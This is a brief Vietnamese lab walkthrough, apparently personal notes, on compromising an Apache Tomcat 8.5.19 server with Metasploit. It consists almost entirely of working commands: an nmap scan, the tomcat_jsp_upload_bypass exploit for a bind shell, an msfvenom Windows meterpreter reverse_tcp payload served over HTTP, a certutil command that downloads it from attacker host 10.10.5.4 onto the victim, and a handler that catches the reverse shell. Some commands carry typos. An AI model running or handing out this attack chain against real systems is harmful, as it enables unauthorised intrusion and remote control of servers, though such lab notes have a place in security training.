# Exploiting A Vulnerable Apache Tomcat Web Server

Apache tomcat v8.5.19 có bug RCE

Mở MSF:

`setg RHOSTS ip`

`db_nmap -sS -sV -O 10.2.20.126`

Ta thấy xuất hiện Apache Tomcat phiên bản 8.5.19 port 8080

`search type:exploit tomcat_jsp`

`use exploit/multi/http/tomcat_jsp_upload_bypass`

`set payload java/jsp_shell_bind_tcp`

`set SHELL cmd`

`run`

-> cách này sẽ cho ta shell nhưng không phải 1 phiên meterpreter

Ta sẽ vận dụng việc tạo payload bằng msfvenom để tạo phiên meterpreter, và việc đang vào shell hiện tại để chạy payload lấy được phiên meterpreter

Mở 1 tab mới 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port -f exe > meterpreter.exe`

mở kênh để tải payload 

`sudo python -m SimpleHTTPServer 80`

Trở lại tab đầu tiên, mở session cũ 

`sessions 1`

`certutil -urlcache -f http://10.10.5.4/meterpreter.exe meterpreter.exe`

mở 1 tab khác, mở MSF để bật multi/handler

`user multi/handler`

`set PAYLOAD windows/meterpreter/reverse_tcp`

`set LHOST 10.10.5.4`

`set LPOST 1234`

`run`

Chuyển về tab đầu và thực thi payload ở shell máy victim

`.\meterpreter.exe`

-> ta có phiên 








